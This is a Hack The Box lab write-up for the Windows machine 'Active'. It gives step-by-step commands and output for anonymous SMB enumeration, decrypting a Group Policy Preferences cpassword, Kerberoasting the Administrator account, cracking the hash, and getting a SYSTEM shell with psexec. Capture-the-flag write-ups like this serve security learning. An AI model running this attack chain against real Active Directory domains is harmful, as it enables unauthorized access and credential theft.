---
title: "Active - HackTheBox Writeup"
date: 2026-05-09 00:00:00 +0000
categories: [boxes]
tags: [hackthebox, windows, easy, smb, gpp, ms14-025, kerberoasting, active-directory]
image:
  path: /assets/img/box/20/logo.png
---

# HTB Machine Writeup — Active

**Platform:** Hack The Box
**OS:** Windows
**Difficulty:** Easy

## Phase 1: Reconnaissance

### Port Scan (RustScan + Nmap)

```bash
rustscan -a 10.129.7.98 --ulimit 5000
```

**Key open ports:**

| Port     | Service  | Significance                |
| -------- | -------- | --------------------------- |
| 53       | DNS      | Domain Controller indicator |
| 88       | Kerberos | AD authentication           |
| 389/3268 | LDAP     | Active Directory database   |
| 445      | SMB      | File sharing — entry point  |

### Version Detection

```bash
nmap -sC -sV -p 53,88,389,445 10.129.7.98
```

```
Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
Domain: active.htb
```

**Key observations:**

- Windows Server 2008 R2 SP1 — old system, configured during the GPP vulnerability window (pre-2014)
- Ports 88 + 389 + 53 + 445 together = Domain Controller
- Domain name: `active.htb`

---

## Phase 2: SMB Enumeration (Anonymous Access)

List shares without credentials:

```bash
smbclient -L //10.129.7.98 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk
SYSVOL          Disk      Logon server share
Users           Disk
```

**Finding:** `Replication` is a non-default share readable anonymously. This is a misconfiguration — it contains a copy of SYSVOL which holds Group Policy files.

### Download the Replication Share

```bash
smbclient //10.129.7.98/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### Inspect Downloaded Files

```
active.htb/
├── DfsrPrivate/
├── Policies/
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}/
│   │   └── MACHINE/
│   │       └── Preferences/
│   │           └── Groups/
│   │               └── Groups.xml   ← TARGET
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}/
└── scripts/
```

---

## Phase 3: GPP Credential Extraction (MS14-025)

### What is the Vulnerability?

In 2008, Microsoft introduced **Group Policy Preferences (GPP)** — a feature that let admins push local account passwords to machines via Group Policy. The password was stored in `Groups.xml` encrypted with AES-256.

**The problem:** Microsoft accidentally published their own AES encryption key in their documentation. This means anyone who can read SYSVOL can decrypt any GPP password. Microsoft patched this in 2014 (MS14-025) but old configurations remain on disk permanently.

### Read Groups.xml

```bash
cat Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        changed="2018-07-18 20:46:06">
    <Properties
        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
        userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

**Found:** Username `active.htb\SVC_TGS` and an encrypted `cpassword`.

### Decrypt the Password

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
GPPstillStandingStrong2k18
```

**Credentials obtained:** `active.htb\SVC_TGS : GPPstillStandingStrong2k18`

---

## Phase 4: Credential Validation + User Flag

### Validate Credentials

```bash
nxc smb 10.129.7.98 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb
```

```
[+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

### Grab user.txt

```bash
smbclient //10.129.7.98/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18'
smb: \> get SVC_TGS\Desktop\user.txt
```

---

## Phase 5: Kerberoasting → Administrator

### What is Kerberoasting?

Kerberos is the authentication system Active Directory uses. When you want to access a service, the Domain Controller gives you a **TGS ticket** encrypted with that **service account's password hash**.

The weakness: **any authenticated domain user can request a TGS ticket for any account that has an SPN** — no special privileges needed. We take that ticket offline and crack the hash with a wordlist. The DC sees this as completely normal activity.

**Attack flow:**

```
1. Authenticate as SVC_TGS
        ↓
2. Query LDAP: "which accounts have SPNs?"
        ↓
3. DC replies: "Administrator has an SPN"
        ↓
4. Request TGS ticket for Administrator's SPN
        ↓
5. DC returns ticket encrypted with Administrator's password hash
        ↓
6. Crack offline → recover plaintext password
```

### Execute Kerberoasting

```bash
nxc ldap 10.129.7.98 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --kerberoasting hashes.txt
```

```
[*] Total of records returned 1
[*] sAMAccountName: Administrator
    memberOf: Domain Admins, Enterprise Admins, Schema Admins
    pwdLastSet: 2018-07-18
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$aeab9b...
```

**Key observations from output:**

- Only 1 account with SPN: `Administrator`
- Member of every admin group — highest privilege on the domain
- Password not changed since 2018 — likely weak/crackable
- Hash type `$krb5tgs$23$` = RC4-HMAC encryption, faster to crack

### Crack the Hash

```bash
john hashes.txt --wordlist=tools/rockyou.txt --format=krb5tgs
john hashes.txt --show
```

```
?:Ticketmaster1968
```

**Administrator credentials:** `active.htb\Administrator : Ticketmaster1968`

---

## Phase 6: Domain Admin Shell

### Validate Admin Credentials

```bash
nxc smb 10.129.7.98 -u 'Administrator' -p 'Ticketmaster1968' -d active.htb
```

```
[+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

### Get SYSTEM Shell via psexec

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.129.7.98
```

```
[*] Found writable share ADMIN$
[*] Uploading file PfKSvivf.exe
[*] Creating service CHbK on 10.129.7.98
[*] Starting service CHbK

C:\Windows\system32> whoami
nt authority\system
```

### Grab root.txt

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```
